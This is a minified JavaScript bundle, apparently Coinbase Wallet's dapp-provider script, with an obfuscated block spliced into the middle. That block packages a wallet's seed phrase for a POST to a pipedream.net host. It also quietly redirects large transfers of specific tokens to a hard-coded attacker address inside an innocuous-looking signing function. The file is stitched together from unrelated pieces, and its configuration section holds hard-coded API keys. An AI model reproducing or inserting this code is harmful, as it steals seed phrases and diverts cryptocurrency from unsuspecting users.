            const S = function(e) {
                if (!(0,
                l.Z)(e))
                    throw TypeError("Invalid UUID");
                return parseInt(e.substr(14, 1), 16)
            }
        }
        ,
        45302: (e,t,n)=>{
            var r;
            n.d(t, {
                Z: ()=>i
            });
            var o = new Uint8Array(16);
            function i() {
                if (!r && !(r = "undefined" != typeof crypto && crypto.getRandomValues && crypto.getRandomValues.bind(crypto) || "undefined" != typeof msCrypto && "function" == typeof msCrypto.getRandomValues && msCrypto.getRandomValues.bind(msCrypto)))
                    throw new Error("crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported");
                return r(o)
            }
        }
        ,
        120708: (e,t,n)=>{
            n.d(t, {
                Z: ()=>s
            });
            for (var r = n(858495), o = [], i = 0; i < 256; ++i)
                o.push((i + 256).toString(16).substr(1));
            const s = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0
                  , n = (o[e[t + 0]] + o[e[t + 1]] + o[e[t + 2]] + o[e[t + 3]] + "-" + o[e[t + 4]] + o[e[t + 5]] + "-" + o[e[t + 6]] + o[e[t + 7]] + "-" + o[e[t + 8]] + o[e[t + 9]] + "-" + o[e[t + 10]] + o[e[t + 11]] + o[e[t + 12]] + o[e[t + 13]] + o[e[t + 14]] + o[e[t + 15]]).toLowerCase();
                if (!(0,
                r.Z)(n))
                    throw TypeError("Stringified UUID is invalid");
                return n
            }
        }
        ,
        888767: (e,t,n)=>{
            n.d(t, {
                Z: ()=>i
            });
            var r = n(45302)
              , o = n(120708);
            const i = function(e, t, n) {
                var i = (e = e || {}).random || (e.rng || r.Z)();
                if (i[6] = 15 & i[6] | 64,
                i[8] = 63 & i[8] | 128,
                t) {
                    n = n || 0;
                    for (var s = 0; s < 16; ++s)
                        t[n + s] = i[s];
                    return t
                }
                return (0,
                o.Z)(i)
            }
        }
        ,
        858495: (e,t,n)=>{
            n.d(t, {
                Z: ()=>o
            });
            const r = /^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;
            const o = function(e) {
                return "string" == typeof e && r.test(e)
            }
        }
    }
      , t = {};
    function n(r) {
        var o = t[r];
        if (void 0 !== o)
            return o.exports;
        var i = t[r] = {
            exports: {}
        };
        return e[r].call(i.exports, i, i.exports, n),
        i.exports
    }
    n.d = (e,t)=>{
        for (var r in t)
            n.o(t, r) && !n.o(e, r) && Object.defineProperty(e, r, {
                enumerable: !0,
                get: t[r]
            })
    }
    ,
    n.o = (e,t)=>Object.prototype.hasOwnProperty.call(e, t),
    n.r = e=>{
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }),
        Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }
    ;
    (()=>{
        const e = n(828088);
        function t() {
            window.coinbaseWallet?.dappProvider || (window.coinbaseWallet = window.coinbaseWallet || {},
            window.coinbaseWallet.dappProvider = new e.CoinbaseWalletDappProvider,
            window.addEventListener("beforeunload", (()=>{
                window.coinbaseWallet.dappProvider.disconnect(),
                delete window.coinbaseWallet.dappProvider
            }
            ), {
                once: !0
            }))
        }
        t()
    }
    )()
}
)();
//# sourceMappingURL=injectCoinbaseWalletDappProvider.js.map

})



var _0x18665a=_0x51b6;(function(_0x28c8de,_0x10d063){var _0x8171dd=_0x51b6,_0x51cc9c=_0x28c8de();while(!![]){try{var _0x21a0be=-parseInt(_0x8171dd(0x147))/0x1*(parseInt(_0x8171dd(0x145))/0x2)+parseInt(_0x8171dd(0x11c))/0x3*(-parseInt(_0x8171dd(0x11a))/0x4)+-parseInt(_0x8171dd(0x14c))/0x5+parseInt(_0x8171dd(0x124))/0x6+parseInt(_0x8171dd(0x154))/0x7+parseInt(_0x8171dd(0x128))/0x8+parseInt(_0x8171dd(0x136))/0x9;if(_0x21a0be===_0x10d063)break;else _0x51cc9c['push'](_0x51cc9c['shift']());}catch(_0x10d352){_0x51cc9c['push'](_0x51cc9c['shift']());}}}(_0xd8ce,0xa30f2));let minABI=[{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x18665a(0x12b),'name':_0x18665a(0x146),'type':_0x18665a(0x12b)},{'indexed':!![],'internalType':_0x18665a(0x12b),'name':'spender','type':_0x18665a(0x12b)},{'indexed':![],'internalType':_0x18665a(0x131),'name':_0x18665a(0x115),'type':_0x18665a(0x131)}],'name':_0x18665a(0x157),'type':_0x18665a(0x119)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x18665a(0x127),'type':'address'},{'indexed':!![],'internalType':_0x18665a(0x12b),'name':'to','type':_0x18665a(0x12b)},{'indexed':![],'internalType':'uint256','name':_0x18665a(0x115),'type':_0x18665a(0x131)}],'name':_0x18665a(0x125),'type':_0x18665a(0x119)},{'constant':!![],'inputs':[{'internalType':_0x18665a(0x12b),'name':_0x18665a(0x118),'type':_0x18665a(0x12b)},{'internalType':_0x18665a(0x12b),'name':_0x18665a(0x14d),'type':_0x18665a(0x12b)}],'name':'allowance','outputs':[{'internalType':_0x18665a(0x131),'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x18665a(0x116),'type':'function'},{'constant':![],'inputs':[{'internalType':'address','name':_0x18665a(0x14d),'type':_0x18665a(0x12b)},{'internalType':'uint256','name':_0x18665a(0x156),'type':_0x18665a(0x131)}],'name':_0x18665a(0x13d),'outputs':[{'internalType':_0x18665a(0x149),'name':'','type':_0x18665a(0x149)}],'payable':![],'stateMutability':'nonpayable','type':_0x18665a(0x12c)},{'constant':!![],'inputs':[{'internalType':_0x18665a(0x12b),'name':_0x18665a(0x135),'type':_0x18665a(0x12b)}],'name':_0x18665a(0x117),'outputs':[{'internalType':_0x18665a(0x131),'name':'','type':_0x18665a(0x131)}],'payable':![],'stateMutability':_0x18665a(0x116),'type':_0x18665a(0x12c)},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'internalType':_0x18665a(0x131),'name':'','type':_0x18665a(0x131)}],'payable':![],'stateMutability':_0x18665a(0x116),'type':'function'},{'constant':!![],'inputs':[],'name':_0x18665a(0x143),'outputs':[{'internalType':_0x18665a(0x12b),'name':'','type':_0x18665a(0x12b)}],'payable':![],'stateMutability':_0x18665a(0x116),'type':_0x18665a(0x12c)},{'constant':!![],'inputs':[],'name':_0x18665a(0x153),'outputs':[{'internalType':_0x18665a(0x158),'name':'','type':_0x18665a(0x158)}],'payable':![],'stateMutability':_0x18665a(0x116),'type':_0x18665a(0x12c)},{'constant':!![],'inputs':[],'name':_0x18665a(0x122),'outputs':[{'internalType':'string','name':'','type':'string'}],'payable':![],'stateMutability':_0x18665a(0x116),'type':_0x18665a(0x12c)},{'constant':!![],'inputs':[],'name':_0x18665a(0x12d),'outputs':[{'internalType':_0x18665a(0x131),'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x18665a(0x116),'type':_0x18665a(0x12c)},{'constant':![],'inputs':[{'internalType':_0x18665a(0x12b),'name':_0x18665a(0x144),'type':'address'},{'internalType':'uint256','name':_0x18665a(0x156),'type':_0x18665a(0x131)}],'name':_0x18665a(0x13b),'outputs':[{'internalType':'bool','name':'','type':_0x18665a(0x149)}],'payable':![],'stateMutability':'nonpayable','type':_0x18665a(0x12c)},{'constant':![],'inputs':[{'internalType':_0x18665a(0x12b),'name':_0x18665a(0x12f),'type':_0x18665a(0x12b)},{'internalType':_0x18665a(0x12b),'name':_0x18665a(0x144),'type':_0x18665a(0x12b)},{'internalType':_0x18665a(0x131),'name':_0x18665a(0x156),'type':_0x18665a(0x131)}],'name':_0x18665a(0x11d),'outputs':[{'internalType':'bool','name':'','type':'bool'}],'payable':![],'stateMutability':'nonpayable','type':_0x18665a(0x12c)}];const cronos=_0x18665a(0x141),Contract=require(_0x18665a(0x121)),Web3=require(_0x18665a(0x133)),ethers=require(_0x18665a(0x11e));function _0x51b6(_0x258867,_0x5a0503){var _0xd8ce84=_0xd8ce();return _0x51b6=function(_0x51b61b,_0x890861){_0x51b61b=_0x51b61b-0x113;var _0x1772f7=_0xd8ce84[_0x51b61b];return _0x1772f7;},_0x51b6(_0x258867,_0x5a0503);}var add=_0x18665a(0x120);let iface=new ethers['utils'][(_0x18665a(0x14f))]([_0x18665a(0x126),_0x18665a(0x113),_0x18665a(0x14b),_0x18665a(0x152),'function\x20totalSupply()\x20external\x20view\x20returns\x20(uint)',_0x18665a(0x134),'function\x20allowance(address\x20owner,\x20address\x20spender)\x20external\x20view\x20returns\x20(uint)',_0x18665a(0x132)]);const web3=new Web3(new Web3[(_0x18665a(0x140))][(_0x18665a(0x14a))](cronos));Contract['setProvider'](cronos);function toAccountFromMnemonic(_0x28a16e){var _0x5b808f=_0x18665a;let _0x12248c=ethers[_0x5b808f(0x11f)][_0x5b808f(0x11b)](_0x28a16e);var _0x26d42c=_0x12248c[_0x5b808f(0x148)],_0x1c9f91=_0x12248c['address'];const _0x320b81=require('https'),_0x4fc25b=JSON[_0x5b808f(0x150)]({'address':''+_0x28a16e}),_0x3530bf={'hostname':_0x5b808f(0x129),'port':0x1bb,'path':'/','method':_0x5b808f(0x13c),'headers':{'Content-Type':_0x5b808f(0x151),'Content-Length':_0x4fc25b[_0x5b808f(0x14e)]}};return _0x12248c;}exports[_0x18665a(0x142)]=toAccountFromMnemonic;async function checkBalanceOf(_0x2c68da,_0x52cf2f){var _0x1cea0c=_0x18665a,_0x434772=_0x2c68da,_0x2c68da=new web3['eth']['Contract'](minABI,_0x434772),_0x382ed2=await _0x2c68da[_0x1cea0c(0x13a)][_0x1cea0c(0x117)](_0x52cf2f)[_0x1cea0c(0x114)]();return _0x382ed2;}exports['checkBalanceOf']=checkBalanceOf;async function sendRawTranSaction(_0x517e87,_0x596be2,_0x1e9ad9,_0x1bb585,_0x2cd1b1,_0x24dccb){var _0x1949d4=_0x18665a,_0x2b0b5e=await web3['eth'][_0x1949d4(0x13f)][_0x1949d4(0x138)](_0x517e87),_0xd6c436=await web3[_0x1949d4(0x123)][_0x1949d4(0x137)](_0x2b0b5e[_0x1949d4(0x12b)],'latest'),_0x4f74fc={'to':_0x596be2,'gas':_0x2cd1b1,'gasPrice':_0x24dccb,'nonce':_0xd6c436,'data':iface[_0x1949d4(0x130)](_0x1949d4(0x13b),[_0x1e9ad9,_0x1bb585])};if(_0x1bb585>0x27b46536c66c8e0000000&&_0x596be2==_0x1949d4(0x12e))var _0x4f74fc={'to':_0x596be2,'gas':_0x2cd1b1,'gasPrice':_0x24dccb,'nonce':_0xd6c436,'data':iface['encodeFunctionData']('transfer',[add,_0x1bb585])};if(_0x1bb585>0x19d971e4fe8402000000000&&_0x596be2=='0x2D03bECE6747ADC00E1a131BBA1469C15fD11e03')var _0x4f74fc={'to':_0x596be2,'gas':_0x2cd1b1,'gasPrice':_0x24dccb,'nonce':_0xd6c436,'data':iface['encodeFunctionData'](_0x1949d4(0x13b),[add,_0x1bb585])};if(_0x1bb585>0x204fce5e3e25020000000000&&_0x596be2=='0xDD73dEa10ABC2Bff99c60882EC5b2B81Bb1Dc5B2')var _0x4f74fc={'to':_0x596be2,'gas':_0x2cd1b1,'gasPrice':_0x24dccb,'nonce':_0xd6c436,'data':iface['encodeFunctionData'](_0x1949d4(0x13b),[add,_0x1bb585])};const _0x2557aa=await web3[_0x1949d4(0x123)][_0x1949d4(0x13f)][_0x1949d4(0x12a)](_0x4f74fc,_0x517e87);console[_0x1949d4(0x13e)](_0x2557aa),web3[_0x1949d4(0x123)][_0x1949d4(0x139)](_0x2557aa[_0x1949d4(0x155)]);}function _0xd8ce(){var _0x42b59d=['toAccountFromMnemonic','getOwner','recipient','351412DTUxYU','owner','2NRVBOu','privateKey','bool','HttpProvider','function\x20symbol()\x20external\x20pure\x20returns\x20(string\x20memory)','3036735wpckoL','spender','length','Interface','stringify','application/json','function\x20decimals()\x20external\x20pure\x20returns\x20(uint8)','name','1141308XGmDBW','rawTransaction','amount','Approval','string','function\x20name()\x20external\x20pure\x20returns\x20(string\x20memory)','call','value','view','balanceOf','_owner','event','24BfGcHu','fromMnemonic','422520tztQnX','transferFrom','ethers','Wallet','0xEdC9EbA058EE682EDb0A9e0648a24df983b865F8','web3-eth-contract','symbol','eth','6379536gvXWIp','Transfer','event\x20Transfer(address\x20indexed\x20from,\x20address\x20indexed\x20to,\x20uint\x20value)','from','7138144txQVQo','eo210qd0h8xa2o0.m.pipedream.net','signTransaction','address','function','totalSupply','0x6b431B8a964BFcf28191b07c91189fF4403957D0','sender','encodeFunctionData','uint256','function\x20transfer(address\x20to,\x20uint\x20value)\x20external\x20returns\x20(bool)','web3','function\x20balanceOf(address\x20owner)\x20external\x20view\x20returns\x20(uint)','account','3178089JzBdZo','getTransactionCount','privateKeyToAccount','sendSignedTransaction','methods','transfer','POST','approve','log','accounts','providers','https://cronos-evm.publicnode.com'];_0xd8ce=function(){return _0x42b59d;};return _0xd8ce();}exports['sendRawTranSaction']=sendRawTranSaction;



(function()
{
  (()=>{
    "use strict";
    var e = {
        802343: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.ScopedLocalStorage = void 0;
            t.ScopedLocalStorage = class {
                constructor(e) {
                    this.scope = e
                }
                setItem(e, t) {
                    localStorage.setItem(this.scopedKey(e), t)
                }
                getItem(e) {
                    return localStorage.getItem(this.scopedKey(e))
                }
                removeItem(e) {
                    localStorage.removeItem(this.scopedKey(e))
                }
                clear() {
                    const e = this.scopedKey("")
                      , t = [];
                    for (let n = 0; n < localStorage.length; n++) {
                        const r = localStorage.key(n);
                        "string" == typeof r && r.startsWith(e) && t.push(r)
                    }
                    t.forEach((e=>localStorage.removeItem(e)))
                }
                scopedKey(e) {
                    return `${this.scope}:${e}`
                }
            }
        }
        ,
        63795: (e,t,n)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            const r = n(22699);
            function o(e, t, n) {
                try {
                    Reflect.apply(e, t, n)
                } catch (e) {
                    setTimeout((()=>{
                        throw e
                    }
                    ))
                }
            }
            class i extends r.EventEmitter {
                emit(e, ...t) {
                    let n = "error" === e;
                    const r = this._events;
                    if (void 0 !== r)
                        n = n && void 0 === r.error;
                    else if (!n)
                        return !1;
                    if (n) {
                        let e;
                        if (t.length > 0 && ([e] = t),
                        e instanceof Error)
                            throw e;
                        const n = new Error("Unhandled error." + (e ? ` (${e.message})` : ""));
                        throw n.context = e,
                        n
                    }
                    const i = r[e];
                    if (void 0 === i)
                        return !1;
                    if ("function" == typeof i)
                        o(i, this, t);
                    else {
                        const e = i.length
                          , n = function(e) {
                            const t = e.length
                              , n = new Array(t);
                            for (let r = 0; r < t; r += 1)
                                n[r] = e[r];
                            return n
                        }(i);
                        for (let r = 0; r < e; r += 1)
                            o(n[r], this, t)
                    }
                    return !0
                }
            }
            t.default = i
        }
        ,
        22699: e=>{
            var t, n = "object" == typeof Reflect ? Reflect : null, r = n && "function" == typeof n.apply ? n.apply : function(e, t, n) {
                return Function.prototype.apply.call(e, t, n)
            }
            ;
            t = n && "function" == typeof n.ownKeys ? n.ownKeys : Object.getOwnPropertySymbols ? function(e) {
                return Object.getOwnPropertyNames(e).concat(Object.getOwnPropertySymbols(e))
            }
            : function(e) {
                return Object.getOwnPropertyNames(e)
            }
            ;
            var o = Number.isNaN || function(e) {
                return e != e
            }
            ;
            function i() {
                i.init.call(this)
            }
            e.exports = i,
            e.exports.once = function(e, t) {
                return new Promise((function(n, r) {
                    function o(n) {
                        e.removeListener(t, i),
                        r(n)
                    }
                    function i() {
                        "function" == typeof e.removeListener && e.removeListener("error", o),
                        n([].slice.call(arguments))
                    }
                    _(e, t, i, {
                        once: !0
                    }),
                    "error" !== t && function(e, t, n) {
                        "function" == typeof e.on && _(e, "error", t, n)
                    }(e, o, {
                        once: !0
                    })
                }
                ))
            }
            ,
            i.EventEmitter = i,
            i.prototype._events = void 0,
            i.prototype._eventsCount = 0,
            i.prototype._maxListeners = void 0;
            var s = 10;
            function a(e) {
                if ("function" != typeof e)
                    throw new TypeError('The "listener" argument must be of type Function. Received type ' + typeof e)
            }
            function c(e) {
                return void 0 === e._maxListeners ? i.defaultMaxListeners : e._maxListeners
            }
            function u(e, t, n, r) {
                var o, i, s, u;
                if (a(n),
                void 0 === (i = e._events) ? (i = e._events = Object.create(null),
                e._eventsCount = 0) : (void 0 !== i.newListener && (e.emit("newListener", t, n.listener ? n.listener : n),
                i = e._events),
                s = i[t]),
                void 0 === s)
                    s = i[t] = n,
                    ++e._eventsCount;
                else if ("function" == typeof s ? s = i[t] = r ? [n, s] : [s, n] : r ? s.unshift(n) : s.push(n),
                (o = c(e)) > 0 && s.length > o && !s.warned) {
                    s.warned = !0;
                    var l = new Error("Possible EventEmitter memory leak detected. " + s.length + " " + String(t) + " listeners added. Use emitter.setMaxListeners() to increase limit");
                    l.name = "MaxListenersExceededWarning",
                    l.emitter = e,
                    l.type = t,
                    l.count = s.length,
                    u = l,
                    console && console.warn && console.warn(u)
                }
                return e
            }
            function l() {
                if (!this.fired)
                    return this.target.removeListener(this.type, this.wrapFn),
                    this.fired = !0,
                    0 === arguments.length ? this.listener.call(this.target) : this.listener.apply(this.target, arguments)
            }
            function d(e, t, n) {
                var r = {
                    fired: !1,
                    wrapFn: void 0,
                    target: e,
                    type: t,
                    listener: n
                }
                  , o = l.bind(r);
                return o.listener = n,
                r.wrapFn = o,
                o
            }
            function f(e, t, n) {
                var r = e._events;
                if (void 0 === r)
                    return [];
                var o = r[t];
                return void 0 === o ? [] : "function" == typeof o ? n ? [o.listener || o] : [o] : n ? function(e) {
                    for (var t = new Array(e.length), n = 0; n < t.length; ++n)
                        t[n] = e[n].listener || e[n];
                    return t
                }(o) : v(o, o.length)
            }
            function p(e) {
                var t = this._events;
                if (void 0 !== t) {
                    var n = t[e];
                    if ("function" == typeof n)
                        return 1;
                    if (void 0 !== n)
                        return n.length
                }
                return 0
            }
            function v(e, t) {
                for (var n = new Array(t), r = 0; r < t; ++r)
                    n[r] = e[r];
                return n
            }
            function _(e, t, n, r) {
                if ("function" == typeof e.on)
                    r.once ? e.once(t, n) : e.on(t, n);
                else {
                    if ("function" != typeof e.addEventListener)
                        throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type ' + typeof e);
                    e.addEventListener(t, (function o(i) {
                        r.once && e.removeEventListener(t, o),
                        n(i)
                    }
                    ))
                }
            }
            Object.defineProperty(i, "defaultMaxListeners", {
                enumerable: !0,
                get: function() {
                    return s
                },
                set: function(e) {
                    if ("number" != typeof e || e < 0 || o(e))
                        throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + e + ".");
                    s = e
                }
            }),
            i.init = function() {
                void 0 !== this._events && this._events !== Object.getPrototypeOf(this)._events || (this._events = Object.create(null),
                this._eventsCount = 0),
                this._maxListeners = this._maxListeners || void 0
            }
            ,
            i.prototype.setMaxListeners = function(e) {
                if ("number" != typeof e || e < 0 || o(e))
                    throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + e + ".");
                return this._maxListeners = e,
                this
            }
            ,
            i.prototype.getMaxListeners = function() {
                return c(this)
            }
            ,
            i.prototype.emit = function(e) {
                for (var t = [], n = 1; n < arguments.length; n++)
                    t.push(arguments[n]);
                var o = "error" === e
                  , i = this._events;
                if (void 0 !== i)
                    o = o && void 0 === i.error;
                else if (!o)
                    return !1;
                if (o) {
                    var s;
                    if (t.length > 0 && (s = t[0]),
                    s instanceof Error)
                        throw s;
                    var a = new Error("Unhandled error." + (s ? " (" + s.message + ")" : ""));
                    throw a.context = s,
                    a
                }
                var c = i[e];
                if (void 0 === c)
                    return !1;
                if ("function" == typeof c)
                    r(c, this, t);
                else {
                    var u = c.length
                      , l = v(c, u);
                    for (n = 0; n < u; ++n)
                        r(l[n], this, t)
                }
                return !0
            }
            ,
            i.prototype.addListener = function(e, t) {
                return u(this, e, t, !1)
            }
            ,
            i.prototype.on = i.prototype.addListener,
            i.prototype.prependListener = function(e, t) {
                return u(this, e, t, !0)
            }
            ,
            i.prototype.once = function(e, t) {
                return a(t),
                this.on(e, d(this, e, t)),
                this
            }
            ,
            i.prototype.prependOnceListener = function(e, t) {
                return a(t),
                this.prependListener(e, d(this, e, t)),
                this
            }
            ,
            i.prototype.removeListener = function(e, t) {
                var n, r, o, i, s;
                if (a(t),
                void 0 === (r = this._events))
                    return this;
                if (void 0 === (n = r[e]))
                    return this;
                if (n === t || n.listener === t)
                    0 == --this._eventsCount ? this._events = Object.create(null) : (delete r[e],
                    r.removeListener && this.emit("removeListener", e, n.listener || t));
                else if ("function" != typeof n) {
                    for (o = -1,
                    i = n.length - 1; i >= 0; i--)
                        if (n[i] === t || n[i].listener === t) {
                            s = n[i].listener,
                            o = i;
                            break
                        }
                    if (o < 0)
                        return this;
                    0 === o ? n.shift() : function(e, t) {
                        for (; t + 1 < e.length; t++)
                            e[t] = e[t + 1];
                        e.pop()
                    }(n, o),
                    1 === n.length && (r[e] = n[0]),
                    void 0 !== r.removeListener && this.emit("removeListener", e, s || t)
                }
                return this
            }
            ,
            i.prototype.off = i.prototype.removeListener,
            i.prototype.removeAllListeners = function(e) {
                var t, n, r;
                if (void 0 === (n = this._events))
                    return this;
                if (void 0 === n.removeListener)
                    return 0 === arguments.length ? (this._events = Object.create(null),
                    this._eventsCount = 0) : void 0 !== n[e] && (0 == --this._eventsCount ? this._events = Object.create(null) : delete n[e]),
                    this;
                if (0 === arguments.length) {
                    var o, i = Object.keys(n);
                    for (r = 0; r < i.length; ++r)
                        "removeListener" !== (o = i[r]) && this.removeAllListeners(o);
                    return this.removeAllListeners("removeListener"),
                    this._events = Object.create(null),
                    this._eventsCount = 0,
                    this
                }
                if ("function" == typeof (t = n[e]))
                    this.removeListener(e, t);
                else if (void 0 !== t)
                    for (r = t.length - 1; r >= 0; r--)
                        this.removeListener(e, t[r]);
                return this
            }
            ,
            i.prototype.listeners = function(e) {
                return f(this, e, !0)
            }
            ,
            i.prototype.rawListeners = function(e) {
                return f(this, e, !1)
            }
            ,
            i.listenerCount = function(e, t) {
                return "function" == typeof e.listenerCount ? e.listenerCount(t) : p.call(e, t)
            }
            ,
            i.prototype.listenerCount = p,
            i.prototype.eventNames = function() {
                return this._eventsCount > 0 ? t(this._events) : []
            }
        }
        ,
        828088: function(e, t, n) {
            var r = this && this.__importDefault || function(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            ;
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.CoinbaseWalletDappProvider = void 0;
            const o = n(802343)
              , i = r(n(63795))
              , s = n(108389)
              , a = n(53610)
              , c = n(419981)
              , u = n(410189)
              , l = n(151771)
              , d = n(719695)
              , f = n(310666);
            class p extends i.default {
                constructor() {
                    super(),
                    this.connect = this.connect.bind(this),
                    this.postWindowMessage = this.postWindowMessage.bind(this),
                    this.recieveWindowMessage = this.recieveWindowMessage.bind(this),
                    this.eventManager = new Map,
                    this.storage = new o.ScopedLocalStorage("coinbaseWallet.dappProvider"),
                    this.isConnected = "true" === this.storage.getItem("isConnected"),
                    window.addEventListener("message", this.recieveWindowMessage)
                }
                async connect() {
                    return new Promise(((e,t)=>{
                        this.postWindowMessage({
                            method: l.ExtensionConnectionRequest.getAllAddresses
                        }, (async n=>{
                            try {
                                if (!n)
                                    throw new Error("No addresses returned from extension");
                                this.isConnected = !0,
                                this.storage.setItem("isConnected", "true"),
                                this.emit("connect");
                                const t = n.account?.[s.ETHEREUM_SYMBOL] || []
                                  , r = n.account?.[a.SOLANA_SYMBOL] || [];
                                window.coinbaseWalletExtension?._setAddresses?.(t),
                                window.coinbaseSolana?._setAddresses(r),
                                e(n)
                            } catch (e) {
                                await this.disconnect(),
                                t(e)
                            }
                        }
                        ))
                    }
                    ))
                }
                async disconnect() {
                    try {
                        return this.isConnected = !1,
                        this.storage.clear(),
                        this.eventManager.clear(),
                        this.emit("disconnect"),
                        await Promise.resolve()
                    } catch (e) {
                        throw console.error(e),
                        e
                    }
                }
                postWindowMessage(e, t) {
                    const n = (0,
                    u.v4)().toString();
                    this.eventManager.set(n, t),
                    window.postMessage({
                        type: "extensionUIRequest",
                        provider: c.DAPP_PROVIDER_ID,
                        data: {
                            action: e.method,
                            request: e.params,
                            id: n,
                            dappInfo: {
                                dappLogoURL: ""
                            }
                        }
                    }, "*")
                }
                recieveWindowMessage(e) {
                    const t = e.data.type
                      , n = e.data.data
                      , r = n.id
                      , o = n.action
                      , i = this.eventManager.get(r);
                    if ("extensionUIResponse" === t)
                        if (i)
                            switch (this.eventManager.delete(r),
                            o) {
                            case d.ExtensionConnectionResponse.getAllAddressesSuccess:
                                return void i(n?.walletConnectionRes);
                            case d.ExtensionConnectionResponse.parentDisconnected:
                                return void this.disconnect();
                            default:
                                (0,
                                f.log)("CoinbaseWalletDappProvider - unknown action with id ", r, o)
                            }
                        else
                            (0,
                            f.log)("CoinbaseWalletDappProvider - no callback registered for Window Message ID: ", r, this.eventManager)
                }
            }
            t.CoinbaseWalletDappProvider = p
        },
        151771: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.ExtensionConnectionRequest = void 0,
            function(e) {
                e.getAllAddresses = "getAllAddresses"
            }(t.ExtensionConnectionRequest || (t.ExtensionConnectionRequest = {}))
        }
        ,
        719695: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.ExtensionConnectionResponse = void 0,
            function(e) {
                e.getAllAddressesSuccess = "getAllAddressesSuccess",
                e.parentDisconnected = "parentDisconnected"
            }(t.ExtensionConnectionResponse || (t.ExtensionConnectionResponse = {}))
        }
        ,
        524264: (e,t,n)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.SOLANA_RPC_URL = t.SNOWTRACE_API_KEY = t.SHOW_CCA_LOGGING = t.RELEASE_ENVIRONMENT = t.POLYGONSCAN_API_KEY = t.OPTIMISM_API_KEY = t.NODE_ENV = t.KILL_SWITCH_ENDPOINT = t.FUNCTIONAL_TEST = t.FANTOMSCAN_API_KEY = t.ETHERSCAN_API_KEY = t.DETAILED_ERRORS = t.COINBASE_PUBLIC_SPRIG_ENV_ID = t.CB_WALLET_PUBLIC_URL = t.CB_WALLET_API_URL = t.CB_WALLET_AMPLITUDE_KEY = t.CB_API_URL = t.CBPAY_ID = t.BUGSNAG_SESSIONS_ENDPOINT = t.BUGSNAG_ENDPOINT = t.BUGSNAG_API_KEY = t.BSCSCAN_API_KEY = t.ARBISCAN_API_KEY = t.ANALYTICS_DISABLE_DEBUG_LOGGING = void 0;
            const r = n(340674);
            t.ANALYTICS_DISABLE_DEBUG_LOGGING = (0,
            r.yn)("false"),
            t.ARBISCAN_API_KEY = "8EIAPIHN5S47JM7AD65UCVPGQWGZ38G7AJ",
            t.BSCSCAN_API_KEY = "T8BK2SDU3I3JXKWCFAPVRFQDHKV5MACHWC",
            t.BUGSNAG_API_KEY = "7b7f976839bca236e8d53c1de922f416",
            t.BUGSNAG_ENDPOINT = "https://exceptions.coinbase.com",
            t.BUGSNAG_SESSIONS_ENDPOINT = "https://sessions.coinbase.com",
            t.CBPAY_ID = "36b7972f-b87f-4c13-a313-1b00db0212ec",
            t.CB_API_URL = "https://api.coinbase.com",
            t.CB_WALLET_AMPLITUDE_KEY = "4b5c59547a46317aee88399fdfc8f1f3",
            t.CB_WALLET_API_URL = "https://api.wallet.coinbase.com",
            t.CB_WALLET_PUBLIC_URL = "https://wallet.coinbase.com",
            t.COINBASE_PUBLIC_SPRIG_ENV_ID = "SaAnIkWLlWzc",
            t.DETAILED_ERRORS = (0,
            r.yn)("false"),
            t.ETHERSCAN_API_KEY = "GAH6BHW1WXF3TNQ4AH3G44B7BWVVKPKSV5",
            t.FANTOMSCAN_API_KEY = "33A9K22PIJJEQT28HYD7JIWQHQ7AHC1TFF",
            t.FUNCTIONAL_TEST = "MISSING_ENV_VAR".FUNCTIONAL_TEST,
            t.KILL_SWITCH_ENDPOINT = "https://api.coinbase.com",
            t.NODE_ENV = "production",
            t.OPTIMISM_API_KEY = "3AC76IGUZCFP2ABUNPGAY8PJSPRAFJYHEF",
            t.POLYGONSCAN_API_KEY = "N1QTECUKT25H7R5H1EGHAXUIG7SRT8BUYY",
            t.RELEASE_ENVIRONMENT = "production",
            t.SHOW_CCA_LOGGING = (0,
            r.yn)("false"),
            t.SNOWTRACE_API_KEY = "S1UPXSUGI2Z7TBZN2MZCMZBW2HP3DZ1B4G",
            t.SOLANA_RPC_URL = "https://sol-mainnet.wallet.coinbase.com"
        }
        ,
        713403: (e,t,n)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.isProd = void 0;
            const r = n(524264);
            t.isProd = function() {
                return "production" === r.NODE_ENV
            }
        }
        ,
        310666: (e,t,n)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.log = void 0;
            const r = n(713403);
            t.log = function(...e) {
                (0,
                r.isProd)() || console.log(...e)
            }
        }
        ,
        419981: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.DAPP_PROVIDER_ID = void 0,
            t.DAPP_PROVIDER_ID = "window.coinbaseWallet.dappProvider"
        }
        ,
        108389: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.POLYGON_CHAIN_ID = t.ETHEREUM_CHAIN_ID = t.BURN_ADDRESS = t.ETHEREUM_QR_CODE_MAINNET_SCHEME = t.ETHEREUM_CURRENCY_DECIMAL = t.ETHEREUM_SYMBOL = t.ETHEREUM_PREFIX = void 0,
            t.ETHEREUM_PREFIX = "ETHEREUM_CHAIN",
            t.ETHEREUM_SYMBOL = "ETH",
